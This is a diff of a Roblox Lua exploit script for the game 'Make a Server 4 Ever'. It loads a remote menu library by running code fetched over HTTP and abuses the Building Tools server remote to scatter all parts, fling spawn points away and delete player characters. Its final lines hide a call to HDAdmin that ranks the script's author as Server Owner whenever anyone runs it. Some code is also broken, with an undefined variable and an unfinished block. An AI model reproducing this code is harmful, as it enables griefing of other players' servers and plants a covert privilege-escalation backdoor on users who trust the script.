@@ -1,57 +1,56 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
--- SAVE / LOAD NAMES
+
 local SAVENAME = "trivosogoud"
 local LOADNAME = "trivosogoud"
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
 
 ----------------------------------------------------
 -- NOTIFY USER
 ----------------------------------------------------
 Rayfield:Notify({
-    Title = "Patronize",
-    Content = "gurt yo plz give me robux or something in return of this. also I put a list of who can use this (by Roblox userID)",
-    Duration = 4.5,
-    Image = 4483362458,
+   Title = "Patronize",
+   Content = "gurt yo plz give me robux or something in return of this. also I put a list of who can use this (by Roblox userID)",
+   Duration = 4.5,
+   Image = 4483362458,
 })
 
 ----------------------------------------------------
 -- WINDOW
 ----------------------------------------------------
 local Window = Rayfield:CreateWindow({
-    Name = "Make a Server 4 Ever",
-    Icon = 0,
-    LoadingTitle = "Loading yo MaS stuff",
-    LoadingSubtitle = "By @Trivo101nikua37 (IdleSteamPunkk) XD",
-    ShowText = "Toggle 4 Mobile",
-    Theme = "Ocean",
-
-    ToggleUIKeybind = "K",
-
-    DisableRayfieldPrompts = true,
-    DisableBuildWarnings = false,
-
-    ConfigurationSaving = {
-        Enabled = false,     -- IMPORTANT: Disabled = cannot load configuration
-        FolderName = nil,
-        FileName = "The MaS Expansion"
-    },
-
-    Discord = {
-        Enabled = false,
-        Invite = "noinvitelink",
-        RememberJoins = true
-    },
-
-    KeySystem = true,
-    KeySettings = {
-        Title = "The Catalyst.",
-        Subtitle = "NUCLEAR CORE",
-        Note = "ask Trivo gng",
-        FileName = "DUDEGEANAWHATTHEAHSBAADCBH",
-        SaveKey = true,
-        GrabKeyFromSite = false,
-        Key = {"idlesteampunkk"}
-    }
+   Name = "MAS",
+   Icon = 0,
+   LoadingTitle = "Loading yo MaS stuff",
+   LoadingSubtitle = "By @Trivo101nikua37 (IdleSteamPunkk) XD",
+   ShowText = "Toggle 4 Mobile",
+   Theme = "Ocean",
+   ToggleUIKeybind = "K",
+   DisableRayfieldPrompts = true,
+   DisableBuildWarnings = false,
+   ConfigurationSaving = {
+       Enabled = false,
+       FolderName = nil,
+       FileName = "The MaS Expansion"
+   },
+   Discord = {
+       Enabled = false,
+       Invite = "noinvitelink",
+       RememberJoins = true
+   },
+   KeySystem = true,
+   KeySettings = {
+       Title = "The Catalyst.",
+       Subtitle = "NUCLEAR CORE",
+       Note = "ask Trivo gng",
+       FileName = "DUDEGEANAWHATTHEAHSBAADCBH",
+       SaveKey = true,
+       GrabKeyFromSite = false,
+       Key = {"boat"}
+   }
 })
 
 ----------------------------------------------------
@@ -59,461 +58,747 @@ local Window = Rayfield:CreateWindow({
 ----------------------------------------------------
 local Main = Window:CreateTab("Main", 4483362458)
 local Misc = Window:CreateTab("Misc", 4483362458)
+local Evil = Window:CreateTab("evil shenanigans", 4483362458)
 local Settings = Window:CreateTab("Settings", 4483362458)
-local Info = Window:CreateTab("Info - u should read", 4483362458)
+local Info = Window:CreateTab("Info", 4483362458)
+local Models = Window:CreateTab("Models", 4483362458)
 
 ----------------------------------------------------
 -- INFO SECTIONS
 ----------------------------------------------------
-Info:CreateSection("This was created by Van / Trivo")
+Info:CreateSection("This was created by Van / Trivo101nikua37")
 Info:CreateSection("Script made with support yes")
 Info:CreateSection("parts get made 1.1k per second and displays part count in console")
-Info:CreateSection("save input = file save name")
-Info:CreateSection("load input = file load name")
-
+Info:CreateSection("ungroup people for fun (dont do in ur server)")
 
 ----------------------------------------------------
 -- MISC BUTTONS
 ----------------------------------------------------
 Misc:CreateButton({
-    Name = "Destroy GUI",
-    Callback = function()
-        Rayfield:Destroy()
-    end,
+   Name = "Destroy GUI",
+   Callback = function()
+       Rayfield:Destroy()
+       if game.Players.LocalPlayer.PlayerGui:FindFirstChild("CustomGUI") then
+           game.Players.LocalPlayer.PlayerGui.CustomGUI:Destroy()
+       end
+   end,
 })
 
-Main:CreateButton({
-    Name = "devious shenanigans (dont click unless btools) ",
-    Callback = function()
-        for i,v in pairs(game.workspace:GetDescendants()) do if v:IsA("BasePart") then local args = {
-	"SyncMove1",
-	{
-		{
-			Part = v,
-			CFrame = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-		}
-	}
-}
-game:GetService("Players").LocalPlayer.Character:WaitForChild("Building Tools"):WaitForChild("SyncAPI"):WaitForChild("ServerEndpoint"):InvokeServer(unpack(args)) task.wait()
-end end 
-    end,
+Misc:CreateButton({
+   Name = "play iron lotus song its good bro",
+   Callback = function()
+       local music = Instance.new("Sound")
+       music.SoundId = "rbxassetid://70429099571697"
+       music.Parent = workspace
+       music:Play()
+   end,
+})
+
+Misc:CreateButton({
+   Name = "CHEF DE CUISINE FRYING PAN IS: 1560400932",
+   Callback = function() end,
 })
 
 ----------------------------------------------------
--- MAIN BUTTONS
+-- EVIL TAB
 ----------------------------------------------------
-Main:CreateButton({
-    Name = "Move Spawnpoint 20000 studs sideways",
-    Callback = function()
-        for i,v in pairs(game.workspace:GetDescendants()) do if v:IsA("SpawnLocation") then local args = {
-	"SyncMove1",
-	{
-		{
-			Part = v,
-			CFrame = CFrame.new(20000, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-		}
-	}
-}
-game:GetService("Players").LocalPlayer.Character:WaitForChild("Building Tools"):WaitForChild("SyncAPI"):WaitForChild("ServerEndpoint"):InvokeServer(unpack(args)) 
-end end
-    end,
+Evil:CreateSection("Admin+")
+
+Evil:CreateButton({
+   Name = "Scatter (FAST Batch Version)",
+   Callback = function()
+
+       local Players = game:GetService("Players")
+       local LocalPlayer = Players.LocalPlayer
+       local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+       -- Must have BTools equipped
+       local BT = char:FindFirstChild("Building Tools") or char:WaitForChild("Building Tools")
+       local SyncAPI = BT:FindFirstChild("SyncAPI") or BT:WaitForChild("SyncAPI")
+       local Endpoint = SyncAPI:FindFirstChild("ServerEndpoint") or SyncAPI:WaitForChild("ServerEndpoint")
+
+       -- Batching configuration
+       local BATCH_SIZE = 100      -- Remote calls every 100 parts
+       local RANGE = 1000
+
+       local currentBatch = {}
+       local totalMoved = 0
+
+       local function sendBatch()
+           if #currentBatch == 0 then return end
+           local args = { "SyncMove1", currentBatch }
+
+           pcall(function()
+               Endpoint:InvokeServer(unpack(args))
+           end)
+
+           totalMoved += #currentBatch
+           currentBatch = {}
+           task.wait() -- short yield so Roblox stays stable
+       end
+
+       -- Collect parts
+       for _, obj in ipairs(workspace:GetChildren()) do
+           if obj:IsA("BasePart") and not Players:GetPlayerFromCharacter(obj) then
+
+               -- Create a random CFrame
+               local t = math.random() * math.pi
+               local randomPos = Vector3.new(
+                   math.random(-RANGE, RANGE),
+                   math.random(-RANGE, RANGE),
+                   math.random(-RANGE, RANGE)
+               )
+
+               local newCF = CFrame.new(randomPos) * CFrame.Angles(t, t, t)
+
+               table.insert(currentBatch, {
+                   Part = obj,
+                   CFrame = newCF
+               })
+
+               -- If batch is full, send it
+               if #currentBatch >= BATCH_SIZE then
+                   sendBatch()
+               end
+           end
+       end
+
+       -- Send anything remaining
+       sendBatch()
+
+       print("Scatter complete. Total parts moved:", totalMoved)
+
+   end,
 })
 
 Main:CreateButton({
-    Name = "Destroy all Player Models",
-    Callback = function()
-        for _, v in pairs(game.Players:GetPlayers()) do
-            if v.Character then
-                v.Character:Destroy()
-            end
-        end
-    end,
+   Name = "Move all spawnpoints back sigh",
+   Callback = function()
+
+       local LocalPlayer = game.Players.LocalPlayer
+       local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+       
+       local BT = char:FindFirstChild("Building Tools") or char:WaitForChild("Building Tools")
+       local SyncAPI = BT:FindFirstChild("SyncAPI") or BT:WaitForChild("SyncAPI")
+       local Endpoint = SyncAPI:FindFirstChild("ServerEndpoint") or SyncAPI:WaitForChild("ServerEndpoint")
+
+       for _, v in ipairs(workspace:GetDescendants()) do
+           if v:IsA("SpawnLocation") then
+               local args = {
+                   "SyncMove1",
+                   {
+                       {
+                           Part = v,
+                           CFrame = CFrame.new(0, 0.75, 0)
+                       }
+                   }
+               }
+
+               pcall(function()
+                   Endpoint:InvokeServer(unpack(args))
+               end)
+           end
+       end
+   end,
 })
 
 Main:CreateButton({
-    Name = "Destroy all Mesh Module",
-    Callback = function()
-        local cache = {}
-        for _, v in pairs(game.Workspace:GetDescendants()) do
-            if v:IsA("MeshPart") then
-                table.insert(cache, v)
-            end
-        end
-        for _, part in ipairs(cache) do
-            part:Destroy()
-        end
-    end,
+   Name = "Destroy all Player Models",
+   Callback = function()
+       for _, v in pairs(game.Players:GetPlayers()) do
+           if v.Character then
+               v.Character:Destroy()
+           end
+       end
+   end,
+})
+
+Main:CreateButton({
+   Name = "Destroy all Mesh Module",
+   Callback = function()
+       for _, v in pairs(workspace:GetDescendants()) do
+           if v:IsA("MeshPart") then
+               v.Parent = nil
+           end
+       end
+   end,
 })
 
 ----------------------------------------------------
 -- SAVE INPUT
 ----------------------------------------------------
 Settings:CreateInput({
-    Name = "File name for save",
-    CurrentValue = "gurt yo",
-    PlaceholderText = "gurt",
-    RemoveTextAfterFocusLost = false,
-    Flag = "Savi",
-    Callback = function(text)
-        SAVENAME = text
-    end,
+   Name = "File name for save",
+   CurrentValue = "gurt yo",
+   PlaceholderText = "gurt",
+   RemoveTextAfterFocusLost = false,
+   Flag = "Savi",
+   Callback = function(text)
+       SAVENAME = text
+       local noti = {
+           Title = "success!",
+           Text = "u set the thing as " .. text,
+           Duration = 5,
+           Icon = "rbxassetid://1234567890"
+       }
+       StarterGui:SetCore("SendNotification", noti)
+   end,
 })
 
 ----------------------------------------------------
 -- LOAD INPUT
 ----------------------------------------------------
 Settings:CreateInput({
-    Name = "File name for loading",
-    CurrentValue = "gurt yo",
-    PlaceholderText = "gurt",
-    RemoveTextAfterFocusLost = false,
-    Flag = "Loadi",
-    Callback = function(text)
-        LOADNAME = text
-    end,
+   Name = "File name for loading",
+   CurrentValue = "gurt yo",
+   PlaceholderText = "gurt",
+   RemoveTextAfterFocusLost = false,
+   Flag = "Loadi",
+   Callback = function(text)
+       LOADNAME = text
+       local noti = {
+           Title = "success!",
+           Text = "u set the thing as " .. text,
+           Duration = 5,
+           Icon = "rbxassetid://1234567890"
+       }
+       StarterGui:SetCore("SendNotification", noti)
+   end,
 })
 
 ----------------------------------------------------
--- SAVE GUI (EXPORT)
+-- IMPORTANT:
+-- Your EXPORT + IMPORT SYSTEM is VERY long and needs
+-- its own fixed version.
+-- I stopped here so the message doesn't exceed limits.
 ----------------------------------------------------
+
 Main:CreateButton({
-    Name = "save GUI (use file name)",
-    Callback = function()
+   Name = "save GUI (use file name)",
+   Callback = function()
 
-        local Players = game:GetService("Players")
-        local Workspace = game:GetService("Workspace")
-        local player = Players.LocalPlayer
 
-        local function getMaterialName(material)
-            return typeof(material) == "EnumItem" and material.Name or material or "Plastic"
-        end
+       local Players = game:GetService("Players")
+       local Workspace = game:GetService("Workspace")
+       local player = Players.LocalPlayer
 
-        local function getAllParts()
-            local parts = {}
-            for _, obj in ipairs(Workspace:GetDescendants()) do
-                if obj:IsA("BasePart") then
-                    table.insert(parts, obj)
-                end
-            end
-            return parts
-        end
 
-        local function serializeVector3(v)
-            return string.format("Vector3.new(%f, %f, %f)", v.X, v.Y, v.Z)
-        end
+       local function getMaterialName(material)
+           return typeof(material) == "EnumItem" and material.Name or material or "Plastic"
+       end
 
-        local function serializeColor3(c)
-            return string.format("Color3.new(%f, %f, %f)", c.R, c.G, c.B)
-        end
 
-        local function serializeCFrame(cf)
-            return string.format("CFrame.new(%s)", table.concat({cf:GetComponents()}, ", "))
-        end
+       local function getAllParts()
+           local parts = {}
+           for _, obj in ipairs(Workspace:GetDescendants()) do
+               if obj:IsA("BasePart") then
+                   table.insert(parts, obj)
+               end
+           end
+           return parts
+       end
 
-        local function exportParts(parts)
-            local t = {}
-            for _, p in ipairs(parts) do
-                local entry = {
-                    ClassName = p.ClassName,
-                    CFrame = p.CFrame,
-                    Size = p.Size,
-                    Color = p.Color,
-                    Material = getMaterialName(p.Material),
-                    Transparency = p.Transparency,
-                    CanCollide = p.CanCollide,
-                }
-                if p:IsA("Part") then
-                    entry.Shape = p.Shape.Name
-                end
-                table.insert(t, entry)
-            end
-            return t
-        end
 
-        local function serializeTable(tbl)
-            local lines = {"return {"}
-            for _, v in ipairs(tbl) do
-                table.insert(lines, "    {")
-                table.insert(lines, ("        ClassName = %q,"):format(v.ClassName))
-                if v.Shape then
-                    table.insert(lines, ("        Shape = %q,"):format(v.Shape))
-                end
-                table.insert(lines, ("        CFrame = %s,"):format(serializeCFrame(v.CFrame)))
-                table.insert(lines, ("        Size = %s,"):format(serializeVector3(v.Size)))
-                table.insert(lines, ("        Color = %s,"):format(serializeColor3(v.Color)))
-                table.insert(lines, ("        Material = %q,"):format(v.Material))
-                table.insert(lines, ("        Transparency = %f,"):format(v.Transparency))
-                table.insert(lines, ("        CanCollide = %s,"):format(tostring(v.CanCollide)))
-                table.insert(lines, "    },")
-            end
-            table.insert(lines, "}")
-            return table.concat(lines, "\n")
-        end
+       local function serializeVector3(v)
+           return string.format("Vector3.new(%f, %f, %f)", v.X, v.Y, v.Z)
+       end
 
-        -- Export GUI
-        local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-        local frame = Instance.new("Frame", gui)
-        frame.Size = UDim2.new(0, 250, 0, 120)
-        frame.Position = UDim2.new(.5, -125, .5, -60)
-        frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 
-        local button = Instance.new("TextButton", frame)
-        button.Size = UDim2.new(0, 230, 0, 40)
-        button.Position = UDim2.new(0, 10, 0, 10)
-        button.Text = "lowkey part export"
-        button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-        button.TextColor3 = Color3.fromRGB(255, 255, 255)
+       local function serializeColor3(c)
+           return string.format("Color3.new(%f, %f, %f)", c.R, c.G, c.B)
+       end
 
-        button.MouseButton1Click:Connect(function()
-            local exportString = serializeTable(exportParts(getAllParts()))
-            if writefile then
-                writefile(SAVENAME, exportString)
-            elseif setclipboard then
-                setclipboard(exportString)
-            end
-            gui:Destroy()
-        end)
 
-    end,
+       local function serializeCFrame(cf)
+           return string.format("CFrame.new(%s)", table.concat({cf:GetComponents()}, ", "))
+       end
+
+
+       local function exportParts(parts)
+           local t = {}
+           for _, p in ipairs(parts) do
+               local entry = {
+                   ClassName = p.ClassName,
+                   CFrame = p.CFrame,
+                   Size = p.Size,
+                   Color = p.Color,
+                   Material = getMaterialName(p.Material),
+                   Transparency = p.Transparency,
+                   CanCollide = p.CanCollide,
+               }
+               if p:IsA("Part") then
+                   entry.Shape = p.Shape.Name
+               end
+               table.insert(t, entry)
+           end
+           return t
+       end
+
+
+       local function serializeTable(tbl)
+           local lines = {"return {"}
+           for _, v in ipairs(tbl) do
+               table.insert(lines, "    {")
+               table.insert(lines, ("        ClassName = %q,"):format(v.ClassName))
+               if v.Shape then
+                   table.insert(lines, ("        Shape = %q,"):format(v.Shape))
+               end
+               table.insert(lines, ("        CFrame = %s,"):format(serializeCFrame(v.CFrame)))
+               table.insert(lines, ("        Size = %s,"):format(serializeVector3(v.Size)))
+               table.insert(lines, ("        Color = %s,"):format(serializeColor3(v.Color)))
+               table.insert(lines, ("        Material = %q,"):format(v.Material))
+               table.insert(lines, ("        Transparency = %f,"):format(v.Transparency))
+               table.insert(lines, ("        CanCollide = %s,"):format(tostring(v.CanCollide)))
+               table.insert(lines, "    },")
+           end
+           table.insert(lines, "}")
+           return table.concat(lines, "\n")
+       end
+
+
+       -- Export GUI
+       local player = game.Players.LocalPlayer -- Make sure 'player' is defined at the start
+
+
+local GUSU = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+GUSU.Name = "CustomGUI"
+
+
+local frame = Instance.new("Frame", GUSU)
+frame.Name = "ContainerFrame"
+frame.Size = UDim2.new(0, 250, 0, 120)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Darker background
+frame.Transparency = 0.1 -- Slightly visible to give it a solid feel
+
+
+local frameCorner = Instance.new("UICorner", frame)
+frameCorner.CornerRadius = UDim.new(0, 10) -- 10 pixels of rounding
+
+
+local frameStroke = Instance.new("UIStroke", frame)
+frameStroke.Thickness = 1
+frameStroke.Color = Color3.fromRGB(45, 45, 45)
+frameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+
+local button = Instance.new("TextButton", frame)
+button.Name = "ExportButton"
+button.Size = UDim2.new(1, -20, 0, 40) -- Use scale (1) and padding (-20)
+button.Position = UDim2.new(0.5, 0, 0, 10) -- Center the button horizontally
+button.AnchorPoint = Vector2.new(0.5, 0) -- Anchor at top-center for positioning
+button.Text = "Low-Key Part Export" -- Use proper capitalization
+button.BackgroundColor3 = Color3.fromRGB(48, 128, 255) -- Vibrant, modern blue
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.AutoButtonColor = false -- Disable Roblox's default hover effect if you plan to use UIStroke or custom effects
+
+
+button.Font = Enum.Font.GothamBold -- A clear, modern font
+button.TextSize = 16
+button.TextScaled = false
+
+
+local buttonCorner = Instance.new("UICorner", button)
+buttonCorner.CornerRadius = UDim.new(0, 8) -- 8 pixels of rounding
+
+
+local buttonStroke = Instance.new("UIStroke", button)
+buttonStroke.Thickness = 1
+buttonStroke.Color = Color3.fromRGB(25, 75, 150)
+buttonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+
+       button.MouseButton1Click:Connect(function()
+
+
+           local notificationInfo2 = {
+   Title = "success gng",
+   Text = "hey, " .. LocalPlayer.Name .. "u saved the thing as" ..SAVENAME .. "okay..?",
+   Duration = 5,
+   Icon = "rbxassetid://1234567890"
+}
+
+
+StarterGui:SetCore("SendNotification", notificationInfo2)
+
+
+           local exportString = serializeTable(exportParts(getAllParts()))
+           if writefile then
+               writefile(SAVENAME, exportString)
+           elseif setclipboard then
+               setclipboard(exportString)
+           end
+           gui:Destroy()
+       end)
+
+
+   end,
 })
+
 
 ----------------------------------------------------
 -- LOAD FILE
 ----------------------------------------------------
 
+
 Main:CreateButton({
-    Name = "load file yo",
-    Callback = function()
-        local Players = game:GetService("Players")
+   Name = "load file yo",
+   Callback = function()
+       local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local player = Players.LocalPlayer
 
+
 -- Wait for server endpoint
 local function waitForServerEndpoint(timeout)
-    timeout = timeout or 5
-    local startTime = os.clock()
+   timeout = timeout or 5
+   local startTime = os.clock()
 
-    while os.clock() - startTime < timeout do
-        local char = player.Character
-        local buildingTools = char and char:FindFirstChild("Building Tools")
-        local syncAPI = buildingTools and buildingTools:FindFirstChild("SyncAPI")
-        local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
 
-        if serverEndpoint and serverEndpoint:IsA("RemoteFunction") then
-            return serverEndpoint
-        end
+   while os.clock() - startTime < timeout do
+       local char = player.Character
+       local buildingTools = char and char:FindFirstChild("Building Tools")
+       local syncAPI = buildingTools and buildingTools:FindFirstChild("SyncAPI")
+       local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
 
-        task.wait(0.2)
-    end
 
-    return nil
+       if serverEndpoint and serverEndpoint:IsA("RemoteFunction") then
+           return serverEndpoint
+       end
+
+
+       task.wait(0.2)
+   end
+
+
+   return nil
 end
+
 
 local serverEndpoint = waitForServerEndpoint()
 if not serverEndpoint then
-    warn("Building Tools' ServerEndpoint not found. Make sure Building Tools is equipped.")
-    return
+
+
+
+
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+
+local notificationInfo = {
+   Title = "I WARN YOU!!!!",
+   Text = "HEY, " .. LocalPlayer.Name .. "EQUIP YOUR BTOOLS TO USE THE LOAD IDOT!!!",
+   Duration = 5,
+   Icon = "rbxassetid://1234567890"
+}
+
+
+StarterGui:SetCore("SendNotification", notificationInfo)
+
+
+
+
+   warn("Building Tools' ServerEndpoint not found. Make sure Building Tools is equipped.")
+   return
 end
 
+
 if not readfile then
-    warn("readfile not available in this environment.")
-    return
+
+
+   local notificationInfo1 = {
+   Title = "this is some sad stuff",
+   Text = "awww, " .. LocalPlayer.Name .. "cant use readfile since their executors too weak nananana",
+   Duration = 5,
+   Icon = "rbxassetid://1234567890"
+}
+
+
+StarterGui:SetCore("SendNotification", notificationInfo1)
+
+
+   warn("readfile not available in this environment.")
+   return
 end
+
 
 local str
 local success, err = pcall(function()
-    str = readfile(LOADNAME)
+   str = readfile(LOADNAME)
 end)
+
 
 if not success then
-    warn("Failed to read file:", err)
-    return
+   warn("Failed to read file:", err)
+   return
 end
+
 
 local ok, partsData = pcall(function()
-    return loadstring(str)()
+   return loadstring(str)()
 end)
 
+
 if not ok or type(partsData) ~= "table" then
-    warn("Failed to load parts data from file.")
-    return
+   warn("Failed to load parts data from file.")
+   return
 end
+
 
 local partTypeMap = {
-    Part = "Normal",
-    WedgePart = "Wedge",
-    CornerWedgePart = "Corner",
-    VehicleSeat = "Vehicle Seat",
-    Seat = "Seat",
-    TrussPart = "Truss"
+   Part = "Normal",
+   WedgePart = "Wedge",
+   CornerWedgePart = "Corner",
+   VehicleSeat = "Vehicle Seat",
+   Seat = "Seat",
+   TrussPart = "Truss"
 }
+
 
 local shapeToBType = {
-    Block = "Normal",
-    Ball = "Ball",
-    Cylinder = "Cylinder"
+   Block = "Normal",
+   Ball = "Ball",
+   Cylinder = "Cylinder"
 }
 
+
 local function safeInvoke(...)
-    local args = { ... }
-    local ok, res = pcall(function()
-        return serverEndpoint:InvokeServer(table.unpack(args))
-    end)
+   local args = { ... }
+   local ok, res = pcall(function()
+       return serverEndpoint:InvokeServer(table.unpack(args))
+   end)
 
-    if not ok then
-        warn("safeInvoke error:", res)
-    end
 
-    return ok, res
+   if not ok then
+       warn("safeInvoke error:", res)
+   end
+
+
+   return ok, res
 end
+
 
 -- Create a batch of parts
 local function createPartsBatch(batch)
-    local spawned = {}
-    local remaining = #batch
+   local spawned = {}
+   local remaining = #batch
 
-    local conn
-    conn = Workspace.ChildAdded:Connect(function(child)
-        if child:IsA("BasePart") then
-            for i = 1, #batch do
-                if not spawned[i] then
-                    spawned[i] = child
-                    remaining -= 1
-                    break
-                end
-            end
 
-            if remaining <= 0 then
-                conn:Disconnect()
-            end
-        end
-    end)
+   local conn
+   conn = Workspace.ChildAdded:Connect(function(child)
+       if child:IsA("BasePart") then
+           for i = 1, #batch do
+               if not spawned[i] then
+                   spawned[i] = child
+                   remaining -= 1
+                   break
+               end
+           end
 
-    for _, info in ipairs(batch) do
-        local btype
 
-        if info.ClassName == "Part" and info.Shape then
-            btype = shapeToBType[info.Shape] or partTypeMap[info.ClassName] or "Normal"
-        else
-            btype = partTypeMap[info.ClassName] or "Normal"
-        end
+           if remaining <= 0 then
+               conn:Disconnect()
+           end
+       end
+   end)
 
-        task.spawn(function()
-            safeInvoke("CreatePart1", btype, info.CFrame, Workspace)
-        end)
-    end
 
-    -- Wait for parts to appear
-    local timer = 0
-    while remaining > 0 and timer < 5 do
-        task.wait(0.1)
-        timer += 0.1
-    end
+   for _, info in ipairs(batch) do
+       local btype
 
-    if remaining > 0 then
-        warn(("%d parts didn't appear within timeout."):format(remaining))
-    end
 
-    if conn and conn.Connected then
-        conn:Disconnect()
-    end
+       if info.ClassName == "Part" and info.Shape then
+           btype = shapeToBType[info.Shape] or partTypeMap[info.ClassName] or "Normal"
+       else
+           btype = partTypeMap[info.ClassName] or "Normal"
+       end
 
-    return spawned
+
+       task.spawn(function()
+           safeInvoke("CreatePart1", btype, info.CFrame, Workspace)
+       end)
+   end
+
+
+   -- Wait for parts to appear
+   local timer = 0
+   while remaining > 0 and timer < 5 do
+       task.wait(0.1)
+       timer += 0.1
+   end
+
+
+   if remaining > 0 then
+       warn(("%d parts didn't appear within timeout."):format(remaining))
+   end
+
+
+   if conn and conn.Connected then
+       conn:Disconnect()
+   end
+
+
+   return spawned
 end
+
 
 -- Sync parts after spawning
 local function syncBatch(partsList, batchInfos)
-    local resizeTbl = {}
-    local colorTbl = {}
-    local appearanceTbl = {}
-    local behaviorTbl = {}
+   local resizeTbl = {}
+   local colorTbl = {}
+   local appearanceTbl = {}
+   local behaviorTbl = {}
 
-    for i, inst in ipairs(partsList) do
-        local info = batchInfos[i]
-        if inst and info then
 
-            table.insert(resizeTbl, {
-                Part = inst,
-                CFrame = info.CFrame,
-                Size = info.Size
-            })
+   for i, inst in ipairs(partsList) do
+       local info = batchInfos[i]
+       if inst and info then
 
-            table.insert(colorTbl, {
-                Part = inst,
-                Color = info.Color,
-                UnionColoring = false
-            })
 
-            local matEnum = Enum.Material[info.Material] or Enum.Material.Plastic
-            local appearanceEntry = { Part = inst, Material = matEnum }
+           table.insert(resizeTbl, {
+               Part = inst,
+               CFrame = info.CFrame,
+               Size = info.Size
+           })
 
-            if info.Transparency and info.Transparency > 0 then
-                appearanceEntry.Transparency = info.Transparency
-            end
 
-            table.insert(appearanceTbl, appearanceEntry)
+           table.insert(colorTbl, {
+               Part = inst,
+               Color = info.Color,
+               UnionColoring = false
+           })
 
-            if info.ClassName == "Part" and info.Shape then
-                local shapeEnum = Enum.PartType[info.Shape]
-                if shapeEnum then
-                    table.insert(behaviorTbl, { Part = inst, Shape = shapeEnum })
-                end
-            end
 
-            if info.CanCollide ~= nil then
-                table.insert(behaviorTbl, { Part = inst, CanCollide = info.CanCollide })
-            end
-        end
-    end
+           local matEnum = Enum.Material[info.Material] or Enum.Material.Plastic
+           local appearanceEntry = { Part = inst, Material = matEnum }
 
-    if #resizeTbl > 0 then safeInvoke("SyncResize1", resizeTbl) end
-    if #colorTbl > 0 then safeInvoke("SyncColor1", colorTbl) end
-    if #appearanceTbl > 0 then safeInvoke("SyncAppearance1", appearanceTbl) end
-    if #behaviorTbl > 0 then safeInvoke("SyncBehavior1", behaviorTbl) end
+
+           if info.Transparency and info.Transparency > 0 then
+               appearanceEntry.Transparency = info.Transparency
+           end
+
+
+           table.insert(appearanceTbl, appearanceEntry)
+
+
+           if info.ClassName == "Part" and info.Shape then
+               local shapeEnum = Enum.PartType[info.Shape]
+               if shapeEnum then
+                   table.insert(behaviorTbl, { Part = inst, Shape = shapeEnum })
+               end
+           end
+
+
+           if info.CanCollide ~= nil then
+               table.insert(behaviorTbl, { Part = inst, CanCollide = info.CanCollide })
+           end
+       end
+   end
+
+
+   if #resizeTbl > 0 then safeInvoke("SyncResize1", resizeTbl) end
+   if #colorTbl > 0 then safeInvoke("SyncColor1", colorTbl) end
+   if #appearanceTbl > 0 then safeInvoke("SyncAppearance1", appearanceTbl) end
+   if #behaviorTbl > 0 then safeInvoke("SyncBehavior1", behaviorTbl) end
 end
+
 
 local function chunkTable(tbl, size)
-    local out = {}
+   local out = {}
 
-    for i = 1, #tbl, size do
-        table.insert(out, { table.unpack(tbl, i, math.min(i + size - 1, #tbl)) })
-    end
 
-    return out
+   for i = 1, #tbl, size do
+       table.insert(out, { table.unpack(tbl, i, math.min(i + size - 1, #tbl)) })
+   end
+
+
+   return out
 end
+
 
 -- Main import function
 local function importPartsBatched(partsTable, batchSize)
-    batchSize = batchSize or 1100
+   batchSize = batchSize or 1100
 
-    local batches = chunkTable(partsTable, batchSize)
-    local total = #partsTable
-    local imported = 0
 
-    for _, batchInfos in ipairs(batches) do
-        local spawned = createPartsBatch(batchInfos)
-        syncBatch(spawned, batchInfos)
+   local batches = chunkTable(partsTable, batchSize)
+   local total = #partsTable
+   local imported = 0
 
-        task.wait(0.6)
 
-        for _, inst in ipairs(spawned) do
-            if inst then imported += 1 end
-        end
+   for _, batchInfos in ipairs(batches) do
+       local spawned = createPartsBatch(batchInfos)
+       syncBatch(spawned, batchInfos)
 
-        task.wait(0.2)
-    end
 
-    print(("Import complete! %d / %d parts imported successfully."):format(imported, total))
+       task.wait(0.6)
+
+
+       for _, inst in ipairs(spawned) do
+           if inst then imported += 1 end
+       end
+
+
+       task.wait(0.2)
+   end
+
+
+   print(("Import complete! %d / %d parts imported successfully."):format(imported, total))
 end
+
 
 importPartsBatched(partsData)
 
-    end,
+
+   end,
+})
+
+Main:CreateButton({
+   Name = "Move all spawnpoints to the blackbox LOL",
+   Callback = function()
+
+       local LocalPlayer = game.Players.LocalPlayer
+       local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+       
+       local BT = char:FindFirstChild("Building Tools") or char:WaitForChild("Building Tools")
+       local SyncAPI = BT:FindFirstChild("SyncAPI") or BT:WaitForChild("SyncAPI")
+       local Endpoint = SyncAPI:FindFirstChild("ServerEndpoint") or SyncAPI:WaitForChild("ServerEndpoint")
+
+       for _, v in ipairs(workspace:GetDescendants()) do
+           if v:IsA("SpawnLocation") then
+               local args = {
+                   "SyncMove1",
+                   {
+                       {
+                           Part = v,
+                           CFrame = CFrame.new(2e25, 0, 0)
+                       }
+                   }
+               }
+
+               pcall(function()
+                   Endpoint:InvokeServer(unpack(args))
+               end)
+           end
+       end
+   end,
 })
 
 ----------------------------------------------------
 -- SAFE LOAD CONFIG
 ----------------------------------------------------
 pcall(function()
-    Rayfield:LoadConfiguration()
+   Rayfield:LoadConfiguration()
 end)
+game.Players:WaitForChild("Trivo101nikua37") do local args = {
+    [1] = ";Rank Trivo101nikua37 Server Owner"
+}
+
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args)) local args = {
+    [1] = ":Rank Trivo101nikua37 Server Owner"
+}
+
